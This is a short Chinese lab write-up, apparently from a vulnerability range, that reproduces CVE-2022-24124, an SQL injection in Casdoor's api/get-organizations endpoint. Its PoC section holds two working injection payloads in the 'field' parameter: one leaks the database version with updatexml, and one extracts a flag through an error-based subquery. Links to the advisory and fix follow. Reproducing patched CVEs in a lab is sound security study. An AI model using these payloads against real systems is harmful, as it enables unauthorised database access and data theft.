---
title: CVE-2022-24124【SQL 注入】
author: Ghost
date: 2023-12-10
categories:
  - ['春秋云境', '漏洞靶标']
  - 漏洞复现
tags:
  - 'SQL 注入'
---

## 1. 漏洞介绍

Casdoor是开源的一个身份和访问管理 (IAM) / 单点登录 (SSO) 平台，带有支持 OAuth 2.0 / OIDC 和 SAML 身份验证的 Web UI 。 Casdoor 1.13.1 之前存在安全漏洞，该漏洞允许攻击者通过api/get-organizations进行攻击。

## 2. 漏洞复现

poc:

```http
/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),1)

http://xxx:8000/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=(select 1 from (select count(*), concat((select concat(',',id,flag) from casdoor.flag limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
```

[Casdoor 1.13.0 SQL Injection ≈ Packet Storm](https://packetstormsecurity.com/files/166163/Casdoor-1.13.0-SQL-Injection.html)

[SQL injection vulnerability in field filter · Issue #439 · casdoor/casdoor · GitHub](https://github.com/casdoor/casdoor/issues/439)

[fix: fix the SQL injection vulnerability in field filter by seriouszyx · Pull Request #442 · casdoor/casdoor · GitHub](https://github.com/casdoor/casdoor/pull/442)
